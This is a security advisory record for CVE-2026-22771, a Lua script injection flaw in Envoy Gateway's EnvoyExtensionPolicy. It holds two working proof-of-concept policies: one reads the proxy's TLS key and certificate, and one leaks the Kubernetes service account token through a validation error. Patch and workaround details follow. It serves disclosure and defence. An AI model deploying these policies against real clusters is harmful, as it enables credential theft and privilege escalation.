advisory_id: GHSA-xrwg-mqj6-6m22
datasource_id: github_osv_importer_v2/GHSA-xrwg-mqj6-6m22
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-xrwg-mqj6-6m22/GHSA-xrwg-mqj6-6m22.json
aliases:
  - CVE-2026-22771
summary: "Envoy Extension Policy lua scripts injection causes arbitrary command execution\n\
  ### Impact\nEnvoy Gateway allows users to create Lua scripts that are executed by Envoy proxy\
  \ using the `EnvoyExtensionPolicy` resource. Administrators can use Kubernetes RBAC to grant\
  \ users the ability to create `EnvoyExtensionPolicy` resources. Lua scripts in policies are\
  \ executed in two contexts:\n* An `EnvoyExtensionPolicy` can be attached to Gateway and xRoute\
  \ resources. Lua scripts in the policy will process traffic in that scope.\n* Lua scripts\
  \ are interpreted and run by the Envoy Gateway controller pod for validation purposes. \n\n\
  Lua scripts executed by Envoy proxy can be used to leak the proxy's credentials. These credentials\
  \ can then be used to communicate with the control plane and gain access to all secrets that\
  \ are used by Envoy proxy, e.g. TLS private keys and credentials used for downstream and upstream\
  \ communication. \n\nFor example, the following EnvoyExtensionPolicy, when executed by Envoy\
  \ proxy, will leak the proxy's XDS client certificates.  \n\n```yaml\napiVersion: gateway.envoyproxy.io/v1alpha1\n\
  kind: EnvoyExtensionPolicy\nmetadata:\n  name: lua-leak\nspec:\n  targetRefs:\n    - group:\
  \ gateway.networking.k8s.io\n      kind: HTTPRoute\n      name: leak\n  lua:\n    - type:\
  \ Inline\n      inline: |\n           function envoy_on_response(response_handle)\n      \
  \       local cert = io.open(\"/certs/tls.crt\", \"r\")\n             local content\n    \
  \         if cert then\n                content = cert:read(\"*all\")\n                cert:close()\n\
  \             else\n                content = \"file-not-found\"\n             end\n     \
  \        local keyfile = io.open(\"/certs/tls.key\", \"r\")\n             local contentkey\n\
  \             if keyfile then\n                contentkey = keyfile:read(\"*all\")\n     \
  \           keyfile:close()\n             else\n                contentkey = \"file-not-found\"\
  \n             end\n             local keypair = contentkey .. \"\\n\" .. content\n      \
  \       response_handle:body():setBytes(keypair)\n             response_handle:headers():replace(\"\
  content-length\", tostring(#keypair))\n             response_handle:headers():replace(\"content-type\"\
  , \"text/plain\")\n           end\n```\n\nThis execution can lead to arbitrary code execution\
  \ in the Envoy Gateway controller pod. Attackers can leverage this to achieve privilege escalation.\
  \ For example, the following `EnvoyExtensionPolicy` will read the Envoy Gateway K8s service\
  \ account token and return it in an error which will be displayed in the resource status.\
  \ \n\n```yaml\napiVersion: gateway.envoyproxy.io/v1alpha1\nkind: EnvoyExtensionPolicy\nmetadata:\n\
  \  name: lua-leak\nspec:\n  targetRefs:\n    - group: gateway.networking.k8s.io\n      kind:\
  \ HTTPRoute\n      name: backend\n  lua:\n    - type: Inline\n      inline: |\n        function\
  \ envoy_on_response(response_handle)\n          local token = io.open(\"/var/run/secrets/kubernetes.io/serviceaccount/token\"\
  , \"r\")\n          local content\n          if token then\n             content = token:read(\"\
  *all\")\n             token:close()\n          else\n             content = \"file-not-found\"\
  \n          end\n          io.write(content)\n          error(content)\n        end\n```\n\
  \nResults in:\n\n```yaml\napiVersion: gateway.envoyproxy.io/v1alpha1\nkind: EnvoyExtensionPolicy\n\
  metadata:\n  name: lua-leak\n[...]\nstatus:\n  ancestors:\n    - ancestorRef:\n        group:\
  \ gateway.networking.k8s.io\n        kind: Gateway\n        name: eg\n        namespace: default\n\
  \      conditions:\n        - lastTransitionTime: \"...\"\n          message: \"Lua: validation\
  \ failed for lua body in policy with name envoyextensionpolicy/default/lua-leak/lua/0:\n \
  \       failed to validate with envoy_on_response: <string>:622: [REDACTED TOKEN]\\nstack\n\
  \        traceback:\\n\\t[G]: in function 'error'\\n\\t<string>:622: in function 'envoy_on_response'\\\
  n\\t<string>:625:\n        in main chunk\\n\\t[G]: ?.\"\n```\n\nAttackers can then use this\
  \ token to steal other secrets, run arbitrary pods in the envoy-gateway-system namespace and\
  \ delete Envoy Gateway itself.  \n\n### Patches\nThe patch sets secure defaults and addresses\
  \ lack of guardrails allowing arbitrary Lua execution:\n* Runs Lua `Strict` validation by\
  \ default in Envoy Gateway along with a security hardening module. This module blocks dangerous\
  \ Lua code that may be executed in proxy and controller pods.\n* Renamed `Syntax` to `InsecureSyntax`\
  \ validation mode to signify that in this validation mode Lua won't be validated for possible\
  \ security gaps.\n* Supports a new `disableLua` option in EnvoyProxy that rejects EnvoyExtenstionPolicies\
  \ with Lua scripts entirely, blocking the option to execute arbitrary Lua code.\n\n### Workarounds\n\
  Envoy Gateway users can create Kubernetes RBAC rules (see [docs](https://kubernetes.io/docs/reference/access-authn-authz/rbac/))\
  \ that apply on EnvoyExtensionPolicy resources to restrict creation of these Lua policies\
  \ to trusted namespaces. Note that this restriction will apply to all EnvoyExtensionPolicies,\
  \ regardless of the extensibility option that is used (Lua, Wasm or Ext-Proc)."
impacted_packages: []
severities:
  - score: '8.8'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-xrwg-mqj6-6m22/GHSA-xrwg-mqj6-6m22.json
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-94
references:
  - url: https://github.com/envoyproxy/gateway
    reference_type:
    reference_id:
  - url: https://github.com/envoyproxy/gateway/security/advisories/GHSA-xrwg-mqj6-6m22
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-22771
    reference_type:
    reference_id:
